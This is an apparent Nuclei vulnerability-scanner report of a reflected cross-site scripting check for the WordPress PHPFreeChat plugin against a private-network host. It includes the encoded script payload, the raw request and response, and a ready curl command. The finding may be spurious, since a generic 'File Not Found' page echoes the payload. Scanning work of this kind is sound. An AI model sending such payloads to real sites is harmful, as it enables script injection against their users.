### WordPress Plugin PHPFreeChat - 'url' Reflected Cross-Site Scripting (XSS) (wp-phpfreechat-xss) found on http://192.168.198.179:8080/
---
**Details**: **wp-phpfreechat-xss**  matched at http://192.168.198.179:8080/

**Protocol**: HTTP

**Full URL**: http://192.168.198.179:8080/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

**Timestamp**: Wed Jun 8 20:22:18 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | WordPress Plugin PHPFreeChat - 'url' Reflected Cross-Site Scripting (XSS) |
| Authors | daffainfo |
| Tags | wordpress, xss, wp-plugin |
| Severity | medium |

**Request**
```http
GET /wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: 192.168.198.179:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.0 200 OK
Connection: close
Content-Length: 259
Content-Type: text/html

<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=</script><script>alert(document.domain)</script></B> was not found.</BODY></HTML>
```

References: 
- https://www.securityfocus.com/bid/54332/info

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' 'http://192.168.198.179:8080/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
---
Generated by [Nuclei 2.7.1](https://github.com/projectdiscovery/nuclei)